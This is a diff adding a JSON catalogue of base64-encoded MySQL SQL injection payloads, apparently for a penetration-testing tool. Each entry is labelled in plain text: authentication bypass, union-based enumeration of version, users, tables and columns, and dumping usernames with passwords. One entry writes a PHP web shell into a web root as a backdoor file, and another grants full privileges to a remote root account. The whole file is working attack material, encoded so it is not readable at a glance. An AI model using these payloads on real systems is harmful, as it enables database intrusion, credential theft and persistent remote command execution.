@@ -1,0 +1,60 @@
+{
+    "command": {
+        "mysql_auth_byass": {
+            "description": "MySQL authentication bypass",
+            "commands": [
+                "YmxhaCcgb3IgMT0xIGxpbWl0IDE7IwpibGFoJyBvciAxPTE7Iwo="
+            ]
+        },
+        "mysql_column_enum_count": {
+            "description": "Enumerate the number of columns",
+            "commands": [
+                "YmxhaCcgb3JkZXIgYnkgMQouCi4KLgpibGFoJyBvcmRlciBieSBuCg=="
+            ]
+        },
+        "mysql_version_enum": {
+            "description": "Enumerate the mysql version",
+            "commands": [
+                "YmxhaCB1bmlvbiBhbGwgc2VsZWN0IDEsMiwzLDQsQEB2ZXJzaW9uLDY="
+            ]
+        },
+        "mysql_user_enum": {
+            "description": "Enumerate the users in mysql db",
+            "commands": [
+                "YmxhaCB1bmlvbiBhbGwgc2VsZWN0IDEsMiwzLDQsdXNlcigpLDYKYmxhaCcgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyw0LHVzZXIoKSw2"
+            ]
+        },
+        "mysql_table_enum": {
+            "description": "Table name enumeration",
+            "commands": [
+                "YmxhaCB1bmlvbiBhbGwgc2VsZWN0IDEsMiwzLDQsdGFibGVfbmFtZSw2IEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcw=="
+            ]
+        },
+        "mysql_column_name_enum": {
+            "description": "Enumerate column names",
+            "commands": [
+                "YmxhaCB1bmlvbiBhbGwgc2VsZWN0IDEsMiwzLDQsY29sdW1uX25hbWUsNiBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9JyROQU1FX09GX1RBQkxFJwpibGFoIHVuaW9uIGFsbCBzZWxlY3QgMSwyLDMsY29sdW1uX25hbWUsNSw2IEZST00gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0nJE5BTUVfT0ZfVEFCTEUnCmJsYWggdW5pb24gYWxsIHNlbGVjdCAxLDIsY29sdW1uX25hbWUsNCw1LDYgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSckTkFNRV9PRl9UQUJMRSc="
+            ]
+        },
+        "mysql_enumerate_adjacent_table_columns": {
+            "description": "Enumeration - Values of two columns of another table (0x3a == ':')",
+            "commands": [
+                "YmxhaCB1bmlvbiBhbGwgc2VsZWN0IDEsMiwzLDQsY29uY2F0KG5hbWUsMHgzYSxwYXNzd29yZCksNiBGUk9NIHVzZXJz"
+            ]
+        },
+        "mysql_drop_webshell": {
+            "description": "Drop a webshell from mysql to disk",
+            "commands": [
+                "YmxhaCB1bmlvbiBhbGwgc2VsZWN0IDEsMiwzLDQsIjw/cGhwIGVjaG8gc2hlbGxfZXhlYygkX0dFVFsnY21kJ10pOz8+Iiw2IGludG8gT1VURklMRSAnYzoveGFtcHAvaHRkb2NzL2JhY2tkb29yLnBocCc="
+            ]
+        },
+        "mysql_grant_privileges": {
+            "description": "Grant all database privileges to remote user in MySQL",
+            "commands": [
+                "R1JBTlQgQUxMIFBSSVZJTEVHRVMgT04gKi4qIFRPICdyb290J0AnMTkyLjE2OC4xMDAuJScgSURFTlRJRklFRCBCWSAnbXktbmV3LXBhc3N3b3JkJyBXSVRIIEdSQU5UIE9QVElPTjs="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
